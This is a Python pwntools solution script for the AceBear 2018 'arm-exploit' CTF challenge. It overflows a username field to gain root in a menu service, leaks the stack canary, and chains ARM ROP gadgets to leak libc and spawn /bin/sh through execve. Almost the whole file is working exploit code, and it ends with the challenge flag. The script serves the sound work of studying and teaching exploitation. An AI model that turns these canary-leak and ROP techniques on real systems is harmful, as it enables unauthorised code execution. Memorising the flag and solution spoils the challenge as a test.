"""
AceBear Security Contest 2018 
arm-exploit pwn challenge solution
"""
# Imports
import re, sys, time
from pwn import *
# Set pwntools context to arm
context.update(arch='arm')


def rop_puts_payload(addr):
  """
  Generates puts ROP payload.
  """
  rop  = p32(0xDEADBEEF)    # ldmfd sp!, {r11, pc}; r11 = 0xDEADBEEF
  rop += p32(0x105DC)       # pc = 0x105DC
  rop += p32(addr)          # ldmfd sp!, {r3, pc}; r3 = addr
  rop += p32(0x109A8)       # mov r0, r3; ldmfd sp!, {r11,pc}
  rop += p32(0xDEADBEEF)    # r11 = 0xDEADBEEF 
  rop += p32(0x10A78)       # pc = 0x10A78; bl puts; nop; mov r0, r3; ldmfd sp!, {r11, pc};
  rop += p32(0xDEADBEEF)    # r11 = 0xDEADBEEF
  rop += p32(0x11020)       # loc_11020 (Return to main menu)    
  return rop


def rop_exeve_payload():
  """
  Generates execve("/bin/sh\x00", 0, 0) ROP payload. Libc addresses were found
  using the rop_puts_payload to leak information about remote libc (remote target has no aslr).
  """
  rop  = p32(0xDEADBEEF)    # ldmfd sp!, {r11, pc}; r11 = 0xDEADBEEF
  rop += p32(0x105DC)       # pc = 0x105DC
  rop += p32(0x105DC)       # ldmfd sp!, {r3, pc}; r3 = 0x105DC
  rop += p32(0x11064)       # pc = 0x11064; mov r2, r9; mov r1, r8; mov r0, r7; blx r3  (Results in r0 = 0, r1 = 0, r2 = 0)             
  rop += p32(0xf67a6b20)    # ldmfd sp!, {r3, pc}; r3 = 0xf67a6b20 (Address of "/bin/sh\x00" in remote libc)
  rop += p32(0xf674b228)    # pc = 0xf674b228; pop {r7, pc}
  rop += p32(0x0b)          # r7 = 0x0b (arm32 syscall number for execve)
  rop += p32(0x109A8)       # mov r0, r3; ldmfd sp!, {r11,pc} (r0 = "/bin/sh\x00")
  rop += p32(0xDEADBEEF)    # r11 = 0xDEADBEEF
  rop += p32(0xf674b808)    # svc 0 (Address of syscall instruction in remote libc. exeve("/bin/sh", 0, 0)) 
  return rop


def get_stack_canary(p):
  """
  Determines the stack canary using regex.
  """
  print p.readuntil('root@arm-exploit:~$ ')
  p.send("echo AAA" + "B" * 112 + "#BYTES#:$")
  out = p.readuntil('root@arm-exploit:~$ ')
  c = re.search(r'(#BYTES#:(....))', out, flags=re.S).group(2)
  return c.replace('$', '\x00')


def menu_info(p):
  """
  Sends menu info option to the remote process.
  """
  print p.readuntil('Your choice: ')
  p.send("1\n")


def menu_login(p, username, password):
  """
  Sends menu login option to the remote process.
  """
  print p.readuntil('Your choice: ')
  p.send("2\n")
  print p.readuntil('Username: ')
  p.send(username)
  print p.readuntil('password: ')
  p.send(username)


def menu_echo_puts(p):
  """
  Sends menu echo option (puts payload) to the remote process.
  """
  print p.readuntil('Your choice: ')
  p.send("3\n")
  stack_canary = get_stack_canary(p)
  p.send("echo " + "B" * 123 + stack_canary + rop_puts_payload(0xf67a6b20))
  print p.readuntil('root@arm-exploit:~$ ')
  p.send("exit\n")
  print "[+] Puts output for 0x%08x: %s" %  (0xf67a6b20, p.recv(4096))


def menu_echo_execve(p):
  """
  Sends menu echo option (execve payload) to the remote process.
  """
  print p.readuntil('Your choice: ')
  p.send("3\n")
  stack_canary = get_stack_canary(p)
  p.send("echo " + "B" * 123 + stack_canary + rop_exeve_payload())
  print p.readuntil('root@arm-exploit:~$ ')
  p.send("exit\n")
  p.interactive()

 
def menu_change_username(p, username):
  """
  Sends menu change username option to the remote process.
  """
  print p.readuntil('Your choice: ')
  p.send("4\n")
  print p.readuntil('New username: ')
  p.send(username)


def menu_exit(p):
  """
  Sends menu exit option to the remote process.
  """
  print p.readuntil('Your choice: ')
  p.send("5\n")


def main():
  """
  Runs on program execution.
  """
  # Read challenge binary into pwntools
  elf = ELF('arm-exploit')

  # Connect to remote challenge 
  p = remote('armexploit.acebear.site', 3001)

  # Login as guest
  menu_login(p, username="A\n", password="B\n")

  # Change user priv to admin
  menu_change_username(p, username=("A" * 32))

  # Change username to root
  menu_change_username(p, username="root\n")

  # Use root echo to run a puts rop payload
  menu_echo_puts(p)

  # Use root echo to spawn a shell
  menu_echo_execve(p)

  # Flag = AceBear{arm_i5_my_sad_m3m0ry}

# Hook
if __name__ == '__main__':
  main()